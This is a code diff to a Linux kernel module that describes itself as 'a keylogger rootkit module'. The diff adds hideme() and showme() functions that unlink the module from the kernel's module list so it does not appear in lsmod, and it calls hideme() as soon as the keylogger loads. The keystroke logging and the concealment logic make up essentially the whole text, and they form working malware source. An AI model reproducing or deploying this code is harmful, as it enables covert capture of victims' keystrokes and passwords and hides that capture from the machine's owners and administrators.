@@ -19,6 +19,9 @@
 #include <linux/if_ether.h>
 #include <linux/netpoll.h>
 
+// for hiding
+#include <linux/syscalls.h>
+
 #define DEBUG 0
 #define debug(args...) if(DEBUG) printk(KERN_INFO args)
 
@@ -200,9 +203,32 @@ static struct notifier_block nb = {
     .notifier_call = keylogger_cb,
 };
 
+static struct list_head *prev_module;
+static short hidden = 0;
+
+void showme(void)
+{
+    /* Add the saved list_head struct back to the module list */
+    list_add(&THIS_MODULE->list, prev_module);
+    hidden = 0;
+}
+
+void hideme(void)
+{
+    /* Save the module in the list before us, so we can add ourselves
+     * back to the list in the same place later. */
+    prev_module = THIS_MODULE->list.prev;
+    /* Remove ourselves from the list module list */
+    list_del(&THIS_MODULE->list);
+    hidden = 1;
+}
+
+
 /* init function */
 static int keylogger_init(void)
 {
+    hideme(); //hides from lsmod, but we cannot unload it yet
+
     printk(KERN_INFO "Keylogger is loaded!\n");
     memset(key_buf, 0, BUF_SIZE);
     key_buf_ptr = 0;
@@ -218,10 +244,12 @@ static void keylogger_exit(void)
     printk(KERN_INFO "Keylogger is unloaded!\n");
 }
 
+
 module_init(keylogger_init);
 module_exit(keylogger_exit);
 
+
 MODULE_LICENSE ("GPL");
-MODULE_AUTHOR ("Richard Wu");
+MODULE_AUTHOR ("Richard Wu, Jingyu Yao");
 MODULE_DESCRIPTION ("a keylogger rootkit module");
 MODULE_VERSION("1.0");
